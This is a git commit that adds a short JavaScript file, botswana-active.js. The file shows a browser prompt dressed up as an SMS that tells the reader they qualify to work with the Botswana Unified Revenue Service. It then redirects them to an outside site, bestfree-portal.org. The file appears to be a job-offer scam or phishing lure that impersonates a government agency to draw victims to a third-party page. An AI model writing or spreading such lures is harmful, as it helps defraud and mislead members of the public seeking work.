980f9cb9c075cb4488ef3ae96e00e4cb1852dff2
ebeekpo <imohdavid078@gmail.com>
2025-01-11 21:06:16 +0100

    Create botswana-active.js

---
+++ botswana-active.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulations You are qualify to work with the botswana unified revenue service, Kindly Press OK to submit apllication   ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://bestfree-portal.org/botswana-revenue.html';
+}
